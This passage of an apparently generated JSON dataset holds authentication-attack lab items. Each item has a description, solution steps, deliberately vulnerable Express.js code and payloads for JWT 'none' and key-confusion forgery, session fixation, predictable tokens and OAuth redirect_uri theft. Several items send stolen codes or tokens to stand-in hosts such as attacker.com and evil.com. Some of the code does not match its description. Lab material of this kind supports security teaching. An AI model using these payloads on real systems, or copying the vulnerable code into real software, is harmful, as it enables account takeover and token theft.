    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send(`Account details for ${decoded.payload.username}`); } else { jwt.verify(token, SECRET, (err, user) => { if (err) return res.status(403).send('Forbidden'); res.send(`Account details for ${user.username}`); }); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{ \"username\":\"carlos\" }."
    ]
  },
  {
    "Lab scenario": "Session Fixation through predictable session IDs",
    "Lab Description": "This lab's session management mechanism uses predictable session identifiers. The server assigns the session ID before authentication and fails to regenerate it after successful login. To solve the lab, pre-set a known session ID for the victim and log in to their account using the same session ID to hijack their session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept your own login flow and observe the Set-Cookie response with a predictable PHPSESSID value.",
      "2. Manually manipulate the session ID by setting the PHPSESSID to 'fixed-session-1337' before the login attempt.",
      "3. Log out and convince the victim to log in using the crafted link embedding your fixed session ID (e.g., http://target.site/login?PHPSESSID=fixed-session-1337).",
      "4. Once the victim logs in, reuse the same session ID 'fixed-session-1337' to access the /my-account endpoint.",
      "5. Successful access to the account page using the shared session ID confirms the vulnerability."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionId = req.cookies['PHPSESSID'] || Math.random().toString(36).substring(2, 15); res.cookie('PHPSESSID', sessionId); res.send(`<form method='POST'><input name='username'><input name='password' type='password'><button type='submit'>Login</button></form>`); }); app.post('/login', (req, res) => { const sessionId = req.cookies['PHPSESSID']; if (sessionId) { res.send('Login successful! Session ID remains the same.'); } else { res.status(400).send('No session ID'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "PHPSESSID=fixed-session-1337",
      "Set-Cookie: PHPSESSID=fixed-session-1337",
      "http://target.site/login?PHPSESSID=fixed-session-1337"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "This lab's OAuth 2.0 implementation uses the implicit flow without validating the redirect URI properly. Attackers can manipulate the redirect_uri parameter to steal access tokens. To solve the lab, craft a malicious OAuth URL to capture Carlos's token and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Analyze the OAuth login request using Burp Suite or OWASP ZAP and observe the 'redirect_uri' parameter.",
      "2. Modify the redirect_uri parameter to point to your controlled server (e.g., http://attacker.com/callback) and send the URL to Carlos.",
      "3. Host a simple HTTP listener on your attacker-controlled server to capture incoming requests with tokens in the URL fragment.",
      "4. When Carlos clicks the malicious link and logs in, the token will be sent to your server via the URI fragment.",
      "5. Use the stolen token in an Authorization: Bearer header to access the /my-account endpoint as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.carlos.signature'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (authHeader && authHeader.includes('carlos')) { res.send('Account details for carlos'); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Lab running on port 4000'));",
    "payloads": [
      "http://target.site/authorize?client_id=lab-client&redirect_uri=http://attacker.com/callback&response_type=token",
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.carlos.signature"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Exploit in Authentication Token Verification",
    "Lab Description": "This lab simulates an application vulnerable to JWT token manipulation due to insecure implementation of the 'none' algorithm during signature verification. The backend fails to enforce token signature validation when 'alg' is set to 'none'. The application issues JWT tokens after successful login, which are used for session authentication. To solve: Forge a JWT token to escalate privileges and access Carlos's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and inspect the JWT after logging into your own account.",
      "Decode the JWT using jwt.io or Burp Decoder to confirm the 'HS256' algorithm is in use.",
      "Modify the token's payload to set 'username':'carlos' and change the algorithm in the header from 'HS256' to 'none'. Remove the signature part.",
      "Send the forged JWT as the Authorization Bearer token using Postman or Burp Repeater.",
      "Access /my-account endpoint and confirm Carlos's account page loads, completing the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst secret = 'supersecret';\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  const token = jwt.sign({ username }, secret, { algorithm: 'HS256' });\n  res.json({ token });\n});\napp.get('/my-account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  const payload = jwt.decode(token, { complete: true });\n  if (payload.header.alg === 'none') {\n    res.send(`Account details for ${payload.payload.username}`);\n  } else {\n    jwt.verify(token, secret, (err, decoded) => {\n      if (err) return res.status(401).send('Invalid Token');\n      res.send(`Account details for ${decoded.username}`);\n    });\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{ \"username\": \"carlos\" }.",
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}, Signature: [empty]"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Token Validation Flow",
    "Lab Description": "This lab focuses on exploiting an OAuth token misconfiguration where the server only verifies the token's issuer claim (`iss`) and skips validation of the access token signature. The lab involves leveraging this weakness to craft a fake token and impersonate a privileged user. To solve: Forge a signed JWT access token with a manipulated issuer pointing to a trusted domain and access Carlos's profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Perform reconnaissance using Burp Suite to capture a valid OAuth token exchange between the client and authorization server.",
      "Use jwt.io to decode the token and observe the 'iss' and 'sub' claims structure.",
      "Create a forged token with the same issuer but modify the 'sub' to 'carlos' using jwt-tool.",
      "Submit the forged token using Postman as an Authorization Bearer token to /my-account.",
      "Verify Carlos's profile loads without server-side token signature validation, confirming successful exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.get('/my-account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  const payload = jwt.decode(token);\n  if (payload.iss === 'https://auth.example.com') {\n    res.send(`Account details for ${payload.sub}`);\n  } else {\n    res.status(403).send('Invalid Token Issuer');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OAuth Misconfiguration Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJjYXJsb3MifQ.fake_signature",
      "{\"iss\":\"https://auth.example.com\", \"sub\":\"carlos\"}",
      "Custom token signed with any secret — as signature is not verified"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie-Based Authentication",
    "Lab Description": "This lab's authentication mechanism is vulnerable to session fixation. When a user logs in, the session identifier is not regenerated, enabling an attacker to set the session ID ahead of authentication. The application accepts any existing session ID and continues the session post-login. To solve: Pre-set a session ID, trick the victim into using it, log in as Carlos and hijack the session using the same ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to observe the session cookie assigned before authentication when accessing /login.",
      "Manually craft a link embedding a preset session cookie, e.g., http://target/login with cookie: sessionid=attackersession123.",
      "Use social engineering or simulated behavior to have the victim log in while using the attacker-defined session ID.",
      "Once Carlos logs in, reuse the fixed session ID to access /my-account.",
      "Confirm Carlos's account page loads, completing the exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\nconst users = { 'carlos': 'password123' };\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    sessions[req.cookies.sessionid] = username;\n    res.send(`Welcome ${username}`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/my-account', (req, res) => {\n  const username = sessions[req.cookies.sessionid];\n  if (username) {\n    res.send(`Account details for ${username}`);\n  } else {\n    res.status(401).send('Not logged in');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: sessionid=attackersession123",
      "Trick victim to log in while using preset sessionid=attackersession123",
      "Use same sessionid=attackersession123 post victim login to hijack the session"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Insecure Cookie Handling in Login Endpoint",
    "Lab Description": "The application's login flow allows session tokens to be set prior to authentication, and the token remains valid post-login. The application fails to invalidate pre-login session cookies. To solve: hijack a session by fixing the session token before authentication and access the target's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, intercept the GET /login request before logging in and note the issued session cookie.",
      "Log in using valid credentials while retaining the same session cookie manually set in the browser.",
      "Craft an attack scenario where you send the fixed session ID to the victim, encouraging them to log in using this session.",
      "After the victim logs in, reuse the fixed session token to gain access to their authenticated account.",
      "Visit /account with the victim's session to verify access and confirm lab completion."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'mypassword' }]; app.get('/login', (req, res) => { let sessionId = req.cookies.session || 'guest123'; res.cookie('session', sessionId); res.send('Session initialized.'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Welcome ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.session === 'guest123') { res.status(403).send('Access denied'); } else { res.send('Account details for valid session holder'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: session=attackerKnownSession",
      "Manually reuse fixed session token post-login",
      "Session fixation with pre-set cookie prior to authentication"
    ]
  },
  {
    "Lab scenario": "JWT Token Tampering in Authorization Header",
    "Lab Description": "The application uses a JSON Web Token (JWT) for session control but does not validate the token signature properly. The application decodes the token but skips signature validation when the 'alg' header is set to 'none'. To solve: craft a JWT token with modified privileges to access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to intercept the Authorization header and decode the JWT using jwt.io.",
      "Confirm the token uses the HS256 algorithm and note the payload structure.",
      "Modify the JWT 'alg' field to 'none' and change the user role in the payload to 'admin'.",
      "Reconstruct the token without a signature and use it in the Authorization header.",
      "Access /admin-panel and verify admin-level access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'weak_secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') { res.send('Admin access granted.'); } else { res.status(403).send('Access denied.'); } }); app.listen(4001);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "Final Token: header.payload."
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception in Redirect URI",
    "Lab Description": "The application relies on OAuth 2.0 authorization but accepts arbitrary redirect URIs after authorization. This allows attackers to intercept the authorization code. To solve: manipulate the redirect URI to capture Carlos's OAuth code and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the OAuth login flow and the redirection after the /authorize endpoint.",
      "Modify the redirect_uri parameter to point to your attacker-controlled server (e.g., http://attacker.com/callback).",
      "Trigger Carlos to initiate an OAuth flow via social engineering, intercept the code parameter at your callback server.",
      "Exchange the intercepted authorization code for an access token using Postman against the /token endpoint.",
      "Use the access token to request Carlos's profile via /api/user and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri, code } = req.query; res.redirect(`${redirect_uri}?code=authcode123`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') { res.json({ access_token: 'valid_token_carlos' }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/api/user', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid_token_carlos') { res.json({ user: 'Carlos', email: 'carlos@example.com' }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.listen(4002);",
    "payloads": [
      "redirect_uri=http://attacker.com/callback",
      "OAuth Authorization Code: authcode123",
      "Access Token: valid_token_carlos"
    ]
  },
  {
    "Lab scenario": "Session Mismanagement Flaw in Access Control for REST API",
    "Lab Description": "This application's REST API uses session IDs set via URL parameters rather than cookies. The server-side logic trusts any session ID provided in the URL without validating user context. To solve: steal and reuse a session ID from a public source to hijack an active session and access another user's sensitive data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Using Burp Suite, intercept a GET /api/profile request and observe the session parameter in the URL.",
      "Use OWASP ZAP's Spider to enumerate all linked session IDs stored in JavaScript or comments.",
      "Extract an exposed session ID from a cached JavaScript file or history log.",
      "Replay the intercepted session ID by sending GET /api/profile?session=stolen-session-id in Postman.",
      "Confirm that the response returns another user's data and access the /api/admin endpoint for full privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = { 'abcd1234': 'carlos', 'efgh5678': 'admin' }; app.get('/api/profile', (req, res) => { const user = sessions[req.query.session]; if (!user) { return res.status(401).send('Invalid session'); } res.send(`Welcome back ${user}`); }); app.get('/api/admin', (req, res) => { const user = sessions[req.query.session]; if (user === 'admin') { res.send('Admin panel accessed'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000);",
    "payloads": [
      "?session=abcd1234",
      "?session=efgh5678",
      "GET /api/profile?session=valid-session-id"
    ]
  },
  {
    "Lab scenario": "JWT Secret Exposure through Verbose Error Responses",
    "Lab Description": "This application's JWT implementation logs signature verification failures verbosely, accidentally revealing the HMAC secret in server debug logs. To solve: trigger error messages and extract the secret to forge a valid admin token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, send an intentionally corrupted JWT to the /validate endpoint and observe server response headers and body.",
      "Use OWASP ZAP passive scanning to detect if error messages leak the HMAC secret.",
      "Once the secret appears in logs, reconstruct a valid JWT using jwt.io or Node.js jwt.sign() with role=admin.",
      "Use Postman to send the forged JWT in the Authorization header.",
      "Access the /admin-dashboard endpoint to confirm the token works and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'superSecretDebugKey'; app.use(express.json()); app.post('/validate', (req, res) => { try { jwt.verify(req.body.token, secret); res.send('Token valid'); } catch (err) { res.status(401).send(`Verification failed: ${err.message} | Secret: ${secret}`); } }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.verify(token, secret); if (payload.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5001);",
    "payloads": [
      "JWT with { \"alg\": \"HS256\", \"role\": \"admin\" }",
      "JWT Header: { \"alg\": \"none\" }",
      "JWT Signature using extracted 'superSecretDebugKey'"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "The OAuth authorization server allows open redirect URIs with wildcard matching. An attacker can craft a malicious redirect_uri to intercept authorization codes. To solve: manipulate the redirect_uri to exfiltrate another user's OAuth code and redeem it for their access token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, observe the OAuth flow and identify the wildcard nature of the redirect_uri parameter.",
      "Modify the redirect_uri parameter to point to http://evil.com/steal?code=.",
      "Trigger a victim user into clicking the OAuth login link by social engineering.",
      "On your server (http://evil.com), capture the authorization code from the URL.",
      "Send a POST request to the /token endpoint using Postman to exchange the intercepted code for an access token, then retrieve the victim's account info from the /profile endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('http')) { return res.redirect(`${redirect_uri}?code=authcode123`); } res.status(400).send('Invalid redirect_uri'); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') { res.json({ access_token: 'access-token-for-carlos' }); } else { res.status(400).json({ error: 'Invalid authorization code' }); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(401).json({ error: 'Invalid token' }); } }); app.listen(5002);",
    "payloads": [
      "redirect_uri=http://evil.com/steal",
      "OAuth Authorization Code: authcode123",
      "access_token=access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT signature confusion in token validation logic",
    "Lab Description": "The application uses JWT tokens for authentication but incorrectly validates the 'alg' field, trusting user-supplied algorithms. If the header specifies 'none', the signature check is skipped entirely. To solve: forge a JWT token assigning yourself 'admin' privileges and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite from the Authorization header.",
      "Use Postman to modify the JWT header by changing \"alg\" to \"none\" and removing the signature section.",
      "Send the manipulated token with 'role=admin' in the payload back in the Authorization header using Postman.",
      "Observe that the server accepts the token due to the 'none' algorithm and grants admin access.",
      "Visit /admin-dashboard using the forged token to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const token = jwt.sign({ username: req.body.username, role: 'user' }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5003);",
    "payloads": [
      "JWT Header: { \"alg\": \"none\" }, Payload: { \"username\": \"admin\", \"role\": \"admin\" }",
      "JWT: eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation through predictable session identifiers",
    "Lab Description": "The application issues session identifiers that are directly derived from the username in a weak hash form. An attacker can predict valid session tokens based on this pattern and hijack active sessions. To solve: predict and reuse a valid session ID to access Carlos's account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Using Burp Suite, log in with a known username and observe the session cookie format.",
      "Use OWASP ZAP to brute-force the MD5 hash of known usernames, confirming the session ID is md5(username).",
      "Craft a session cookie using the MD5 hash of 'carlos' (e.g., md5('carlos')).",
      "Set the forged session cookie in your browser using Burp Suite or Postman.",
      "Access /my-account and confirm Carlos's profile is displayed to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const crypto = require('crypto'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = crypto.createHash('md5').update(req.query.username).digest('hex'); res.cookie('session', session); res.send(`Session created for ${req.query.username}`); }); app.get('/my-account', (req, res) => { const sessions = { 'carlos': crypto.createHash('md5').update('carlos').digest('hex') }; if (req.cookies.session === sessions['carlos']) { res.send('Account details for carlos'); } else { res.send('Access denied'); } }); app.listen(5004);",
    "payloads": [
      "Session Cookie: 2c9a8e6e5d92c3cc2d244360d6b6742f (MD5 of 'carlos')",
      "Cookie: session=2c9a8e6e5d92c3cc2d244360d6b6742f",
      "GET /my-account with forged Cookie"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect flaw in authorization endpoint",
    "Lab Description": "The OAuth provider used by this application allows redirection to arbitrary URLs under the same domain wildcard. This allows attackers to steal OAuth codes by tricking users into clicking crafted links. To solve: craft an OAuth URL that redirects to a malicious endpoint and extract a valid code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the authorization request and identify the redirect_uri parameter accepting wildcards.",
      "Alter the redirect_uri to redirect to http://attacker.com/callback within the allowed wildcard scope.",
      "Send the crafted OAuth link to a victim via phishing or social engineering.",
      "Capture the code on http://attacker.com/callback after the victim authenticates.",
      "Exchange the stolen code for a token at /oauth/token and access the victim's /profile via Postman."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; if (redirectUri.startsWith('http://trusted.com')) { res.redirect(`${redirectUri}?code=stealable-code`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.post('/oauth/token', (req, res) => { if (req.body.code === 'stealable-code') { res.json({ access_token: 'user-token' }); } else { res.status(401).json({ error: 'Invalid code' }); } }); app.get('/profile', (req, res) => { if (req.headers.authorization === 'Bearer user-token') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).send('Access denied'); } }); app.listen(5005);",
    "payloads": [
      "redirect_uri=http://trusted.com.attacker.com/callback",
      "Authorization Code: stealable-code",
      "access_token=user-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Pre-set Session ID in Login Endpoint",
    "Lab Description": "The application allows clients to specify a session ID before authentication is complete. The server trusts this session and associates it with the authenticated user without generating a new one. To solve: predefine a session ID, log in as your user, then reuse the same ID to hijack Carlos's session.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to capture the POST /login request while logging in with your own credentials.",
      "Notice the client-supplied session_id parameter being echoed back in the Set-Cookie header.",
      "Craft a session fixation attack by manually setting session_id to 'carlos-session' before login.",
      "Share the crafted session ID with the victim, or wait for them to log in using the same session_id.",
      "After Carlos logs in, access /my-account while sending the fixed session cookie to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.post('/login', (req, res) => { const { username, password, session_id } = req.body; if (username === 'carlos' && password === 'supersecret') { sessions[session_id] = username; res.cookie('session', session_id).send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(5006);",
    "payloads": [
      "POST /login session_id=carlos-session&username=wiener&password=peter",
      "Reuse session cookie: session=carlos-session",
      "GET /my-account with Cookie: session=carlos-session"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
    "Lab Description": "The application uses JWT for session handling but fails to validate the signature when 'alg' is set to 'none'. The server mistakenly trusts the unverified payload. To solve: craft a JWT with admin privileges and access the admin section using the unsigned token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using OWASP ZAP from an authenticated user request.",
      "Decode the token using jwt.io or Postman to inspect the header and payload.",
      "Modify the header to { \"alg\": \"none\" } and the payload to { \"username\": \"admin\", \"role\": \"admin\" }, omitting the signature.",
      "Resend the crafted JWT in the Authorization header via Postman.",
      "Visit /admin-panel and verify the server grants admin access, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome to the Admin Panel'); } else { res.status(403).send('Access denied'); } }); app.listen(5007);",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Crafted JWT Token: No signature required"
    ]
  },
  {
    "Lab scenario": "OAuth Token Leakage through Referer Header",
    "Lab Description": "The application uses OAuth 2.0 but the authorization code is exposed in the Referer header when redirected back to the client site. An attacker controlling a subdomain can harvest tokens via referer leakage. To solve: intercept the Referer header during login flow and extract the OAuth code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate an OAuth login flow and observe the final redirect to the application’s /callback endpoint.",
      "Set up a malicious site (e.g., http://attacker.com) that embeds the OAuth provider's authorize URL in an iframe.",
      "When the victim authenticates, the Referer header in their redirected request to /callback will expose the OAuth code to attacker.com logs.",
      "Extract the stolen code and exchange it for an access token using Postman.",
      "Use the token to access /profile as the victim and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const code = req.query.code; console.log('Received OAuth Code:', code); res.send(`Welcome back! OAuth code ${code} stored.`); }); app.get('/profile', (req, res) => { if (req.headers.authorization === 'Bearer leaked-user-token') { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).send('Access denied'); } }); app.listen(5008);",
    "payloads": [
      "Embed URL: https://authserver.com/oauth/authorize?client_id=abc&redirect_uri=http://victim.com/oauth/callback",
      "Captured Referer Leak: http://victim.com/oauth/callback?code=leaked-code",
      "Authorization: Bearer leaked-user-token"
    ]
  },
  {
    "Lab scenario": "Session Hijacking via Predictable Session Tokens in REST API",
    "Lab Description": "The application's REST API uses a predictable session token generation scheme based on the username and a static salt. The application does not rotate the token post-login, allowing attackers to precompute tokens for valid users. To solve: predict Carlos's session token and access his profile endpoint.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture your own /api/login response using Postman and observe the returned token format.",
      "Reverse-engineer the token by analyzing the Base64-decoded structure, which is a concatenation of username and a static string.",
      "Manually craft a token for Carlos by applying the same pattern.",
      "Use the token in the Authorization header to query /api/user/profile.",
      "Verify successful access to Carlos's account and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.use(bodyParser.json()); app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = Buffer.from(username + ':staticSalt').toString('base64'); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = Buffer.from(token, 'base64').toString(); if (decoded.startsWith('carlos')) { res.json({ username: 'carlos', email: 'carlos@example.com' }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(5010);",
    "payloads": [
      "Authorization: Bearer Y2FybG9zOnN0YXRpY1NhbHQ=",
      "Base64 of carlos:staticSalt",
      "Y2FybG9zOnN0YXRpY1NhbHQ="
    ]
  },
  {
    "Lab scenario": "JWT Signature Verification Bypass via Key Confusion Attack",
    "Lab Description": "The application uses JWTs to authorize users but fails to differentiate between HMAC and RSA algorithms. Attackers can forge valid tokens by switching the algorithm from RS256 to HS256 and signing it using the public key as the secret. To solve: forge an admin token and access the /admin route.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite during authentication.",
      "Download the public key from the exposed /.well-known/jwks.json endpoint.",
      "Craft a new token by changing the 'alg' header from 'RS256' to 'HS256' and sign it with the public key as the HMAC secret.",
      "Use the forged token in the Authorization header while requesting /admin.",
      "Confirm successful access to the admin section and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { jwt.verify(token, publicKey); const payload = jwt.decode(token); if (payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send(err.message); } }); app.listen(5011);",
    "payloads": [
      "Header: {\"alg\":\"HS256\"}",
      "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
      "Signature: HMAC(publicKey, header.payload)",
      "Final JWT: [header].[payload].[signature]"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Leak via URL Fragment Hijacking",
    "Lab Description": "The OAuth implementation uses the implicit flow and returns access tokens in the URL fragment. Due to a lack of client-side sanitization, an attacker can manipulate redirect URIs to capture tokens via malicious subdomains. To solve: intercept an OAuth token using a crafted redirect URI and access Carlos's data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate an OAuth login flow with Burp Suite and observe the redirect URL containing the access token in the URL fragment.",
